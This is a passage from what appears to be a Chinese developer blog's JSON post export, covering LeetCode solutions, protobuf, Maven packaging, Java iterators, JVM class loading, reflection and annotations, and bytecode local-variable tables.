ListNode next; * ListNode(int x) { * val = x; * next = null; * } * } */ public class Solution { public boolean hasCycle(ListNode head) { Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); while (head!=null){ if (set.contains(head.hashCode())) { return true; } set.add(head.hashCode()); head = head.next; } return false; } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"leetcode-22括号生成","slug":"leetcode-22括号生成","date":"2020-10-10T08:20:35.000Z","updated":"2020-11-14T17:10:34.088Z","comments":true,"path":"2020/10/10/leetcode-22括号生成/","link":"","permalink":"http://yoursite.com/2020/10/10/leetcode-22%E6%8B%AC%E5%8F%B7%E7%94%9F%E6%88%90/","excerpt":"","text":"//数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。 // // // // 示例： // // 输入：n = 3 //输出：[ // &quot;((()))&quot;, // &quot;(()())&quot;, // &quot;(())()&quot;, // &quot;()(())&quot;, // &quot;()()()&quot; // ] // // Related Topics 字符串 回溯算法 // 👍 1356 👎 0 import java.util.ArrayList; import java.util.List; //leetcode submit region begin(Prohibit modification and deletion) class Solution { // 全局变量 private List&lt;String&gt; list = new ArrayList&lt;&gt;(); public List&lt;String&gt; generateParenthesis(int n) { // 生成题目当然不能是for循环生成 dfs(0, 0, n, &quot;&quot;); return list; } public void dfs(int left, int right, int n, String path) { // 排除掉 括号数量太多的选手 if (left &gt; n || right &gt; n) { return; } // 如果右边大于左边，那么就删除当前选手 if (right&gt;left) { return; } // final champion if (left + right == 2 * n) { list.add(path); return; } dfs(left + 1, right, n, path + &quot;(&quot;); dfs(left, right + 1, n, path + &quot;)&quot;); } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"google protobuf","slug":"google protobuf","date":"2020-09-08T06:46:46.000Z","updated":"2020-11-14T17:10:34.571Z","comments":true,"path":"2020/09/08/google protobuf/","link":"","permalink":"http://yoursite.com/2020/09/08/google%20protobuf/","excerpt":"","text":"google protobuf下载工具 https://github.com/protocolbuffers/protobuf/releases/tag/v3.13.0 由于我使用的是windowsX64，我选择win64版本下载后，解压将bin目录放入环境变量里面 编写proto文件新建文件AddressBook.proto文件 syntax = &quot;proto2&quot;; package tutorial; option java_package = &quot;com.example.tutorial&quot;; option java_outer_classname = &quot;AddressBookProtos&quot;; message Person { required string name = 1; required int32 id = 2; optional string email = 3; enum PhoneType { MOBILE = 0; HOME = 1; WORK = 2; } message PhoneNumber { required string number = 1; optional PhoneType type = 2 [default = HOME]; } repeated PhoneNumber phones = 4; } message AddressBook { repeated Person people = 1; }在当前目录运行改命令，注意java_out好像不支持绝对路径,支持相对路径 $ protoc --java_out=. addressbook.proto项目中实战protoc --java_out=../src/main/java addressbook.proto # 新建文件，注意需要修改proto里面的文件里面的package和实际当中的一直 # 说实话，这就是和那个tk-mybatis一样，自动生成文件生成好后，打开文件AddressBookProtos.java文件，是被final修饰的，我们不要修改，还缺一些东西，需要我们引入jar包 &lt;!-- https://mvnrepository.com/artifact/com.google.protobuf/protobuf-java --&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.protobuf&lt;/groupId&gt; &lt;artifactId&gt;protobuf-java&lt;/artifactId&gt; &lt;version&gt;3.12.4&lt;/version&gt; &lt;/dependency&gt;我们来两个案例，一个写文件一个读文件public class WriteValueToFile { public static void main(String[] args) throws IOException { AddressBookProtos.AddressBook addressBook = AddressBookProtos.AddressBook.newBuilder() .mergeFrom(new FileInputStream(&quot;addressBook.txt&quot;)) .addPeople(AddressBookProtos.Person.newBuilder() .setEmail(&quot;adios@qq.com&quot;) .setId(1025) .setName(&quot;adios&quot;) .addPhones(AddressBookProtos.Person.PhoneNumber.newBuilder() .setNumber(&quot;15851741817&quot;) .setType(AddressBookProtos.Person.PhoneType.HOME) .build()) .build()) .build(); FileOutputStream fos = new FileOutputStream(&quot;addressBook.txt&quot;); addressBook.writeTo(fos); fos.close(); } } public class ReadValueFromFile { public static void main(String[] args) throws IOException { FileInputStream fis = new FileInputStream(&quot;addressBook.txt&quot;); AddressBookProtos.AddressBook addressBook = AddressBookProtos.AddressBook.parseFrom(fis); List&lt;AddressBookProtos.Person&gt; peopleList = addressBook.getPeopleList(); for (AddressBookProtos.Person person : peopleList) { System.out.println(&quot;personal information &quot; + person.getId() + &quot; &quot; + person.getEmail() + &quot; &quot; + person.getName()); for (AddressBookProtos.Person.PhoneNumber phone : person.getPhonesList()) { System.out.println(&quot;phone &quot; + phone.getNumber() + &quot; &quot; + phone.getType().getValueDescriptor()); } } } }讲讲为什么学习这个首先在学习netty过程中，多次碰到这个。今天看别人项目，正好看见这个，学习了一下官方文档： https://developers.google.com/protocol-buffers/docs/javatutorial 文档里面讲了：为什么使用这个google protocol Use Java Serialization. This is the default approach since it’s built into the language, but it has a host of well-known problems (see Effective Java, by Josh Bloch pp. 213), and also doesn’t work very well if you need to share data with applications written in C++ or Python. You can invent an ad-hoc way to encode the data items into a single string – such as encoding 4 ints as “12:3:-23:67”. This is a simple and flexible approach, although it does require writing one-off encoding and parsing code, and the parsing imposes a small run-time cost. This works best for encoding very simple data. Serialize the data to XML. This approach can be very attractive since XML is (sort of) human readable and there are binding libraries for lots of languages. This can be a good choice if you want to share data with other applications/projects. However, XML is notoriously space intensive, and encoding/decoding it can impose a huge performance penalty on applications. Also, navigating an XML DOM tree is considerably more complicated than navigating simple fields in a class normally would be. java的序列化没办法和其他语言共享数据 如果是简单的，我们可以设计一个规则，：分割。这对简单数据编码是有效的 使用xml,但是xml会占用大量空间 文中并没有比较json相关的.","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"maven指定运行main函数","slug":"maven指定运行main函数","date":"2020-09-06T14:06:19.000Z","updated":"2020-11-14T17:10:35.068Z","comments":true,"path":"2020/09/06/maven指定运行main函数/","link":"","permalink":"http://yoursite.com/2020/09/06/maven%E6%8C%87%E5%AE%9A%E8%BF%90%E8%A1%8Cmain%E5%87%BD%E6%95%B0/","excerpt":"","text":"maven指定运行main函数背景最近自己写的小项目，打包的时候会出现问题，总是提示缺少主类或者打包好后报 classNotFoundException 错误，最后才发现在这个问题 &lt;build&gt; &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt; &lt;plugins&gt; &lt;plugin&gt; .... &lt;/plugin&gt; &lt;/plugins&gt; &lt;/pluginManagement&gt; &lt;/build&gt;搜索了一下stackoverflowThe difference between &lt;pluginManagement/&gt; and &lt;plugins/&gt; is that a &lt;plugin/&gt; under: &lt;pluginManagement/&gt; defines the settings for plugins that will be inherited by modules in your build. This is great for cases where you have a parent pom file. &lt;plugins/&gt; is an actual invocation of the plugin. It may or may not be inherited from a &lt;pluginManagement/&gt; . You don’t need to have a &lt;pluginManagement/&gt; in your project, if it’s nota parent POM. However, if it’s a parent pom, then in the child’s pom, you needto have a declaration like:大概的意思是pluginManagement是为了有父pom方便继承而plugin是真实调用的 所以，我们要确定一点是，我们需要修改的是build标签下的plugins而不是build pluginManagement下的plugins 方法一：修改jar-plugin，里面加入参数修改compiler-plugin &lt;plugin&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;showDeprecation&gt;true&lt;/showDeprecation&gt; &lt;/configuration&gt; &lt;version&gt;3.8.0&lt;/version&gt; &lt;/plugin&gt;修改jar-plugin&lt;plugin&gt; &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt; &lt;version&gt;3.0.2&lt;/version&gt; &lt;configuration&gt; &lt;archive&gt; &lt;manifest&gt; &lt;mainClass&gt;com.huskyui.LogMain&lt;/mainClass&gt; &lt;/manifest&gt; &lt;/archive&gt; &lt;/configuration&gt; &lt;/plugin&gt;方法二：加入shade插件官方文档 &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-shade-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.4&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;shade&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;transformers&gt; &lt;transformer implementation=&quot;org.apache.maven.plugins.shade.resource.ManifestResourceTransformer&quot;&gt; &lt;manifestEntries&gt; &lt;Main-Class&gt;${app.main.class}&lt;/Main-Class&gt; &lt;/manifestEntries&gt; &lt;/transformer&gt; &lt;/transformers&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;","categories":[],"tags":[{"name":"maven","slug":"maven","permalink":"http://yoursite.com/tags/maven/"}]},{"title":"java中foreach和iterator","slug":"java中foreach和iterator","date":"2020-08-07T05:45:07.000Z","updated":"2020-11-14T17:10:35.611Z","comments":true,"path":"2020/08/07/java中foreach和iterator/","link":"","permalink":"http://yoursite.com/2020/08/07/java%E4%B8%ADforeach%E5%92%8Citerator/","excerpt":"","text":"java中foreach入门今天闲来无事，师父让我看一下，迭代器在一个循环里面连续两次iterator.remove()的问题，因为今天看一个离职人员的代码，里面写了这个。我们看一下测试代码： List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); list.add(4); for (Integer value:list){ logger.debug(value); } //输出 2020-08-07 09:58:12,323 DEBUG (com.huskyui.App:main) -1 2020-08-07 09:58:12,324 DEBUG (com.huskyui.App:main) -2 2020-08-07 09:58:12,325 DEBUG (com.huskyui.App:main) -3 2020-08-07 09:58:12,325 DEBUG (com.huskyui.App:main) -4反编译文件 List&lt;Integer&gt; list = new ArrayList(); list.add(1); list.add(2); list.add(3); list.add(4); Iterator var2 = list.iterator(); while(var2.hasNext()) { Integer value = (Integer)var2.next(); logger.debug(value); } // 生成迭代器iterator迭代器里面的介绍是：_Iterators allow the caller to remove elements from the underlyingcollection during the iteration with well-definedsemantics._迭代器允许调用者在迭代期间使用定义良好的语义从基础集合中删除元素. List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); list.add(4); Iterator iterator = list.iterator(); logger.debug(&quot;Iterator 从前向后遍历:&quot;); while (iterator.hasNext()){ Integer value = (Integer)iterator.next(); logger.debug(value); } // 增强版iterator listIterator logger.debug(&quot;listIterator从前向后遍历&quot;); ListIterator iterator1 = list.listIterator(); while (iterator1.hasNext()){ Integer value = (Integer)iterator1.next(); logger.debug(value); } logger.debug(&quot;listIterator从后向前遍历：&quot;); while (iterator1.hasPrevious()){ logger.debug(iterator1.previous()); } /** 2020-08-07 11:07:44,832 DEBUG (com.huskyui.App:main) -Iterator 从前向后遍历: 2020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -1 2020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -2 2020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -3 2020-08-07 11:07:44,834 DEBUG (com.huskyui.App:main) -4 2020-08-07 11:07:44,835 DEBUG (com.huskyui.App:main) -listIterator从前向后遍历 2020-08-07 11:07:44,835 DEBUG (com.huskyui.App:main) -1 2020-08-07 11:07:44,835 DEBUG (com.huskyui.App:main) -2 2020-08-07 11:07:44,837 DEBUG (com.huskyui.App:main) -3 2020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -4 2020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -listIterator从后向前遍历： 2020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -4 2020-08-07 11:07:44,838 DEBUG (com.huskyui.App:main) -3 2020-08-07 11:07:44,839 DEBUG (com.huskyui.App:main) -2 2020-08-07 11:07:44,839 DEBUG (com.huskyui.App:main) -1 */经典出错 List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); list.add(4); for (Integer value :list){ System.out.println(value); if(value.equals(1)){ list.remove(value); } } // 反编译 List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); list.add(4); Iterator iterator = list.iterator(); while (iterator.hasNext()){ Integer value = (Integer)iterator.next(); System.out.println(value); if(value.equals(1)){ list.remove(value); } } // 出错 // 1 // Exception in thread &quot;main&quot; java.util.ConcurrentModificationException // at java.util.ArrayList$Itr.checkForComodification(ArrayList.java:909) // at java.util.ArrayList$Itr.next(ArrayList.java:859) // at com.huskyui.App.main(App.java:24) // 我们来看iterator在ArrayList的实现 private class Itr implements Iterator&lt;E&gt; { int cursor; // index of next element to return int lastRet = -1; // index of last element returned; -1 if no such int expectedModCount = modCount; Itr() {} // cursor就是游标的大概意思，size是ArrayList的容量 public boolean hasNext() { return cursor != size; } @SuppressWarnings(&quot;unchecked&quot;) public E next() { // 报错是在这里 checkForComodification(); int i = cursor; if (i &gt;= size) throw new NoSuchElementException(); Object[] elementData = ArrayList.this.elementData; if (i &gt;= elementData.length) throw new ConcurrentModificationException(); cursor = i + 1; // 给lastRet负责，有点pre节点的味道了 return (E) elementData[lastRet = i]; } public void remove() { if (lastRet &lt; 0) throw new IllegalStateException(); checkForComodification(); try { ArrayList.this.remove(lastRet); // 指向前一个节点 cursor = lastRet; // lastRet赋初始值，在后续执行next()方法是可以重新赋值 lastRet = -1; expectedModCount = modCount; } catch (IndexOutOfBoundsException ex) { throw new ConcurrentModificationException(); } } // 这个modCount是ArrAyList继承的AbstractList中的变量，记录这个arrayList的修改次数。譬如我们添加了4次，那么这个就是4 final void checkForComodification() { if (modCount != expectedModCount) throw new ConcurrentModificationException(); }为什么我们不能在遍历时，删除，因为arrayList的remove时，并没有修改exceptedModCount,而iterator却可以。 关于foreach两种方式foreach支持1.实现了Iterator接口的2.数组第一种，Iterator反编译后，就是使用Iterator迭代器来实现的第二种，数组形式的foreach int[] array = new int[]{1,2,3,4,5}; for (int num:array){ System.out.println(num); } // 反编译后 int[] array = new int[]{1, 2, 3, 4, 5}; int[] var2 = array; int var3 = array.length; for(int var4 = 0; var4 &lt; var3; ++var4) { int num = var2[var4]; System.out.println(num); }参考 Java基础8：Iterator和foreach循环","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"JVM类加载子系统","slug":"JVM类加载子系统","date":"2020-07-12T17:29:25.000Z","updated":"2020-11-14T17:10:36.450Z","comments":true,"path":"2020/07/13/JVM类加载子系统/","link":"","permalink":"http://yoursite.com/2020/07/13/JVM%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%AD%90%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"在约翰·冯·诺伊曼的计算机模型中，任何程序都需要加载到内存才能与CPU进行交流。 加载过程load 根据一个类的全限类名来获取此类的二进制流（此处并没有说是特指的本地class文件） 将这个class文件所代表的静态存储结构转化为方法区中的运行时结构 在内存中生成一个java.lang.Class 对象，这个对象将作为程序访问方法区中的类型数据的外部接口 其中此类的二进制流，不仅仅是本地的.class文件，也可以是从jar，war包中的，或者使用java自带的基于接口的动态代理，或者基于cglib动态生成的二进制流，或者是老式的jsp，以及加密解密的class文件等等 连接link连接分为三个：验证，准备，解析 验证verification验证是为了运行当前代码不会危害虚拟机自身的安全 文件格式验证 ：1.是否是以0xCAFEBABE开头2.版本号是否在java 。。。。下面就不多赘述 准备prepare为类变量（即静态变量，被static修饰的变量）分配内存并设置类变量初始化。 但是常量（final修饰）在编译javac将常量生成ConstantValue属性，在准备阶段根据ConstantValue设置赋值。 解析java虚拟机将常量池内的符号引用替换为直接引用的过程。 初始化 初始化阶段会执行 &lt;clinit&gt; 方法 调用 clinit 方法前会调用其父类的 clinit 的方法，最初调用应该是 java.lang.object 的 clinit 方法 多线程环境下会竞争 clinit 方法（要避免clinit是个死锁） clinit 主要是对被static修饰的变量和静态代码块进行赋值。如果都不存在，就没有 clinit 初始化6种情况 遇到new、getstatic、putstatic、或invokestatic这个4个指令，如果类型没初始化过，就会初始化一下 通过反射调用时，如果没有初始化就会初始化一下 // 这是java mysql jdbc最基本的方式 // 会通过类加载机制，执行static方法块，在DriverManger里面注册一个Mysql驱动 Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); Connection connection = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/test_index?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC&quot;,&quot;root&quot;,&quot;happyday&quot;); Statement statement = connection.createStatement(); ResultSet resultSet = statement.executeQuery(&quot;select * from test limit 10&quot;); while (resultSet.next()){ System.out.println(resultSet.getInt(&quot;id&quot;)); } //我们来看下，这个com.mysql.cj.jdbc.Driver里面的clinit static { try { java.sql.DriverManager.registerDriver(new Driver()); } catch (SQLException E) { throw new RuntimeException(&quot;Can&apos;t register driver!&quot;); } } 当初始化类的时候，如果父类没有初始化，会触发父类的的初始化 public class ClinitTest1 { static class Father{ public static int a = 1; static { a = 2; } } static class Son extends Father{ public static int b = a; } public static void main(String[] args) { System.out.println(Son.b); } } // 输出 2 当虚拟机启动时，用户需要的指定一个要执行的主类（包含main（）），虚拟机会加载这个类 // 我举了一个不知恰不恰当的例子，通过数组定义引用类并不会触发此类的初始化 public class TestClass { static { System.out.println(&quot;static method&quot;); } public static void main(String[] args) { TestClass[] testClasses = new TestClass[10]; } } // 输出 static method public class TestClass2 { public static void main(String[] args) { TestClass[] testClasses = new TestClass[10]; } } // 无输出 当使用JDK 7新加入的动态语言支持时，如果一个java.lang.invoke.MethodHandle实例最后的解析结果为REF_getStatic、REF_putStatic、REF_invokeStatic、REF_newInvokeSpecial四种类型的方法句柄，并且这个方法句柄对应的类没有进行过初始化，则需要先触发其初始化。 当一个接口中定义了JDK 8新加入的默认方法（被default关键字修饰的接口方法）时，如果有这个接口的实现类发生了初始化，那该接口要在其之前被初始化 举例public class ClassInitTest { private static int num ; static { num = 2; number = 20; System.out.println(num); // System.out.println(number);非法前像引用 } private static int number = 10; public static void main(String[] args) { System.out.println(num); System.out.println(number); } } // 输出 /** 2 2 10 */ /** clinit方法 0 iconst_2 1 putstatic #2 &lt;org/example/jvm/classload/ClassInitTest.num&gt; 4 bipush 20 6 putstatic #3 &lt;org/example/jvm/classload/ClassInitTest.number&gt; 9 getstatic #4 &lt;java/lang/System.out&gt; 12 getstatic #2 &lt;org/example/jvm/classload/ClassInitTest.num&gt; 15 invokevirtual #5 &lt;java/io/PrintStream.println&gt; 18 bipush 10 20 putstatic #3 &lt;org/example/jvm/classload/ClassInitTest.number&gt; 23 return */ /** 反编译的class文件 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by Fernflower decompiler) // package org.example.jvm.classload; public class ClassInitTest { private static int num = 2; private static int number = 20; public ClassInitTest() { } public static void main(String[] args) { System.out.println(num); System.out.println(number); } static { System.out.println(num); number = 10; } } */还有很多我没有举例到，如多线程竞争static方法，数组。。。 类加载器java 团队有意把类的加载阶段的“通过一个类的全限定名来获取描述该类的二进制字节流”放到java虚拟机外部实现，以便让程序自己决定去获取所需类。 这个时候，如果是两个对象比较是否相等的前提必须是同一个类加载器加载比较才有意义。 public class ClassLoaderTest { public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException { ClassLoader classLoader = new ClassLoader() { @Override public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException { try { String fileName = name.substring(name.lastIndexOf(&quot;.&quot;) + 1) + &quot;.class&quot;; InputStream is = getClass().getResourceAsStream(fileName); if (is == null) { return super.loadClass(name); } byte[] b = new byte[is.available()]; is.read(b); return defineClass(name, b, 0, b.length); } catch (IOException e) { e.printStackTrace(); } return null; } }; Object obj = classLoader.loadClass(&quot;org.example.jvm.classload.ClassLoaderTest&quot;).newInstance(); System.out.println(obj); System.out.println(obj instanceof org.example.jvm.classload.ClassLoaderTest); Object obj2 = new ClassLoaderTest(); System.out.println(obj2 instanceof org.example.jvm.classload.ClassLoaderTest); } } // 输出 org.example.jvm.classload.ClassLoaderTest@6e0be858 false true类加载器模型 ![UGJk7D.png](http://qjrzrivoh.hd-bkt.clouddn.com/1605373836.27754478999.png) public class ClassLoaderTest { public static void main(String[] args) { // 获取系统类加载器 ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); System.out.println(systemClassLoader);// sun.misc.Launcher$AppClassLoader@18b4aac2 // 获取扩展类加载器 ClassLoader extClassLoader = systemClassLoader.getParent(); System.out.println(extClassLoader);// sun.misc.Launcher$ExtClassLoader@135fbaa4 // 试图获取bootstrap classloader 但没有获取到为空 System.out.println(extClassLoader.getParent()); // String 是通过引导类来获取的==&gt;java 核心库都是通过bootstrap class loader 来引导的 System.out.println(String.class.getClassLoader()); // sun.misc.Launcher$AppClassLoader@18b4aac2 System.out.println(ClassLoaderTest.class.getClassLoader()); } } // 输出 sun.misc.Launcher$AppClassLoader@18b4aac2 sun.misc.Launcher$ExtClassLoader@4b67cf4d null null sun.misc.Launcher$AppClassLoader@18b4aac2各个类加载器的职责 Bootstrap Class Loader : 加载核心库（JAVA_HOME/jre/lib/rt.jar和resources.jar和sun.boot.class）,是通过c++编写，java获取时是null，譬如String.class就Bootstarp Class Loader加载的 Extension Class Loader： 加载扩展库（java.ext.dirs或jre/lib/ext包） Application Class Loader:加载用户自定义的类 双亲委派机制双亲委派模型应该是叫溯源委派加载模型，起初加载类时，是依次向上询问是否已加载过，然后再向下逐层询问是否可加载。一般在主流中间件都有自定义类加载器，实现类的隔离，防止冲突。 什么情况需要自定义类加载器 隔离加载类：在某些容器框架类进行中间件和应用的隔离，把类加载到不同环境。譬如mybatis中org/apache/ibatis/io中就有自定义类加载器 防止源码泄露：class 文件如果正常jar包反编译，解压一下就可以看见源码，所以需要编译加密，并且自定义类加载器来实现解密还原字节码。 等等 参考 《码出高效》 《深入理解JVM虚拟机》 尚硅谷JVM视频","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"http://yoursite.com/tags/JVM/"}]},{"title":"反射与注解","slug":"反射与注解","date":"2020-07-09T14:14:18.000Z","updated":"2020-11-14T17:10:36.978Z","comments":true,"path":"2020/07/09/反射与注解/","link":"","permalink":"http://yoursite.com/2020/07/09/%E5%8F%8D%E5%B0%84%E4%B8%8E%E6%B3%A8%E8%A7%A3/","excerpt":"","text":"获取Class类的实例a) 若已知具体的类，通过类的class属性获取，该方法最为安全可靠，程序性能最高 Class clazz = Person.class;b) 若已知某个类的实例，调用该实例的getClass()方法获取Class对象 Class clazz = person.getClass();c）已知一个类的全类名，且该类在类路径下，可以通过Class的静态方法forName()获取，可能会抛出ClassNotFoundException Class clazz = Class.forName(&quot;com.test.Person&quot;);d) 内置基本数据类型可以直接使用类名.Type e) 还可以使用ClassLoader我们之后讲解 反射大致使用public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class clazz = Class.forName(&quot;org.example.reflection.User&quot;); Constructor constructor = clazz.getDeclaredConstructor(String.class,int.class,int.class); User user = (User)constructor.newInstance(&quot;huskyui&quot;,18,1); System.out.println(user); // getMethod 入参是null,并且是public Method getName = clazz.getMethod(&quot;getName&quot;,null); System.out.println(getName.invoke(user,null)); // setName 入参是String类型，但是是private修饰的，我们需要使用declaredMethod()，并且使用setAccessible(true) Method method = clazz.getDeclaredMethod(&quot;setName&quot;, String.class); method.setAccessible(true); method.invoke(user,&quot;adios&quot;); System.out.println(user); System.out.println(getName.invoke(user,null)); }注解// 元注解 用于修饰注解 在java.lang.annotationb包下注解 @Target // 需要传入当前注解的，里面的值有 TYPE(class 用),FIELD(字段),METHOD..... @Document // 如果有这个注解，会其注释成为带注释元素的公共API的一部分 @Retention // 指示注解要保留多长时间，默认是RetentionPolicy.ClASS，一般写是RetentionPolicy.RUNIME @Inherited // 举例@Target(ElementType.FIELD) @Retention(value= RetentionPolicy.RUNTIME) public @interface FieldWang { String fieldName(); String type(); int length(); String value() default &quot;hhhh&quot;; } @Target(value = {ElementType.TYPE}) @Retention(value = RetentionPolicy.RUNTIME) public @interface TableWang { String value(); } @TableWang(&quot;db_user&quot;) public class User { @FieldWang(fieldName = &quot;user_name&quot;,type = &quot;varchar&quot;,length = 10) private String name; @FieldWang(fieldName = &quot;user_age&quot;,type = &quot;int&quot;,length=10) private int age; @FieldWang(fieldName = &quot;user_id&quot;,type = &quot;int&quot;,length=11) private int id; public User(String name, int age, int id) { this.name = name; this.age = age; this.id = id; } @Override public String toString() { final StringBuilder sb = new StringBuilder(&quot;User{&quot;); sb.append(&quot;name=&apos;&quot;).append(name).append(&apos;\\&apos;&apos;); sb.append(&quot;, age=&quot;).append(age); sb.append(&quot;, id=&quot;).append(id); sb.append(&apos;}&apos;); return sb.toString(); } public String getName() { return name; } private void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public int getId() { return id; } public void setId(int id) { this.id = id; } } public static void main(String[] args) throws ClassNotFoundException { Class clazz = Class.forName(&quot;org.example.reflection.User&quot;); if(clazz.isAnnotationPresent(TableWang.class)){ TableWang tableWang = (TableWang) clazz.getAnnotation(TableWang.class); System.out.println(tableWang.value()); } for (Field field : clazz.getDeclaredFields()) { if (field.isAnnotationPresent(FieldWang.class)) { FieldWang fieldWang = (FieldWang)field.getAnnotation(FieldWang.class); System.out.println(field.getName()+ &quot; &quot;+ fieldWang.fieldName() + &quot; &quot; + fieldWang.type() + &quot; &quot; + fieldWang.length()); } } } // 输出 /** db_user name user_name varchar 10 age user_age int 10 id user_id int 11 */举例Mybatis中的@Select@Documented @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.METHOD) @Repeatable(Select.List.class) public @interface Select { /** * Returns an SQL for retrieving record(s). * * @return an SQL for retrieving record(s) */ String[] value(); /** * @return A database id that correspond this statement * @since 3.5.5 */ String databaseId() default &quot;&quot;; /** * The container annotation for {@link Select}. * @author Kazuki Shimizu * @since 3.5.5 */ @Documented @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.METHOD) @interface List { Select[] value(); } } @Select(&quot;select * from test where id = 1 for update&quot;) Test selectForUpdate(); // 我们来看mybatis中的org.apache.ibatis.builder.annotation.MapperAnnotationBuilder中的方法void parseStatement(Method method) void parseStatement(Method method) { final Class&lt;?&gt; parameterTypeClass = getParameterType(method); final LanguageDriver languageDriver = getLanguageDriver(method); getAnnotationWrapper(method, true, statementAnnotationTypes).ifPresent(statementAnnotation -&gt; { // 这里获取到Annotation final SqlSource sqlSource = buildSqlSource(statementAnnotation.getAnnotation(), parameterTypeClass, languageDriver, method); 。。。。 } // 我们可以看到annotation.value()方法 private SqlSource buildSqlSource(Annotation annotation, Class&lt;?&gt; parameterType, LanguageDriver languageDriver, Method method) { if (annotation instanceof Select) { return buildSqlSourceFromStrings(((Select) annotation).value(), parameterType, languageDriver);","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"反射","slug":"反射","permalink":"http://yoursite.com/tags/%E5%8F%8D%E5%B0%84/"}]},{"title":"虚拟机栈的局部变量","slug":"虚拟机栈的局部变量","date":"2020-07-01T11:11:59.000Z","updated":"2020-11-14T17:10:37.481Z","comments":true,"path":"2020/07/01/虚拟机栈的局部变量/","link":"","permalink":"http://yoursite.com/2020/07/01/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%88%E7%9A%84%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/","excerpt":"","text":"public class LocalVariableTest { private int count = 0; public static void main(String[] args) { method(); } public static void method() { LocalVariableTest localVariableTest = new LocalVariableTest(); Date date = new Date(); int count = 10; System.out.println(count); } }我们来解析一下method()这个方法 javap -v LocalVariableTest.class // main方法 public static void main(java.lang.String[]); // 入参是 String类型的数组，返回值是Void descriptor: ([Ljava/lang/String;)V // 方法修饰 public 和static flags: ACC_PUBLIC, ACC_STATIC Code: stack=0, locals=1, args_size=1 0: invokestatic #3 // Method method:()V 3: return LineNumberTable: line 14: 0 line 15: 3 LocalVariableTable: Start Length Slot Name Signature 0 4 0 args [Ljava/lang/String; public static void method(); // 入参是空，返回值是void descriptor: ()V // 方法修饰是 public static flags: ACC_PUBLIC, ACC_STATIC Code: stack=2, locals=3, args_size=0 0: new #4 // class org/example/jvm/runtimedata/virtualmachinestack/LocalVariableTest 3: dup 4: invokespecial #5 // Method &quot;&lt;init&gt;&quot;:()V 7: astore_0 8: new #6 // class java/util/Date 11: dup 12: invokespecial #7 // Method java/util/Date.&quot;&lt;init&gt;&quot;:()V 15: astore_1 16: bipush 10 18: istore_2 19: getstatic #8 // Field java/lang/System.out:Ljava/io/PrintStream; 22: iload_2 23: invokevirtual #9 // Method java/io/PrintStream.println:(I)V 26: return // jvm中对应关系，譬如 java文件中18行LocalVariableTest localVariableTest = new LocalVariableTest(); // 对应 jvm指令行 0 0: new #4 // class org/example/jvm/runtimedata/virtualmachinestack/LocalVariableTest LineNumberTable: line 18: 0 line 19: 8 line 20: 16 line 21: 19 line 22: 26 // 局部变量表：localVariableTest ,date,count signature是对应着几个的类型，他们是在一个数组里面的 // localVariableTest是数组index 0的位置，date是index 1的位置count是2的位置 // start是jvm中发对应的局部变量开始生效的位置，length是有效的长度（不详） // jvm指令行中是0-26行，也就是一共27行，而start+length都是27 LocalVariableTable: Start Length Slot Name Signature 8 19 0 localVariableTest 